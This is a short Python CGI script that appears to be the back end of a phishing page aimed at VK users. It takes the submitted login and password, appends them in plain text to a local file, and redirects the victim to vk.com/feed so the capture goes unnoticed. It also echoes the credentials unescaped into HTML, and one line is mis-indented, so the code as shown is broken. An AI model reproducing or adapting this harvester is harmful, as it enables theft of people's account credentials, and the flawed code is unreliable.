import cgi
import html
import sys
import codecs
import smtplib as smtp
sys.stdout = codecs.getwriter("utf-8")(sys.stdout.detach())

form = cgi.FieldStorage()
login = form.getfirst("login", "undefined")
password = form.getfirst("pass", "undefined")

with open("data.txt", "a") as f:
      f.write("login = " + str(login) + "; password = " + str(password) + ".")

   f.write("\n")

print("Content-type: text/html\n")
print("""<!DOCTYPE HTML>
        <html>

       <head>

           <meta charset="utf-8">

           <script>

               var redirect = document.location.href='http://vk.com/feed';

              document.write(redirect);

          </script>

      </head>

      <body>""")

print("<p>login: </p>{}".format(login))

print("<p>password: </p>{}".format(password))

print("""</body>

       </html>""")
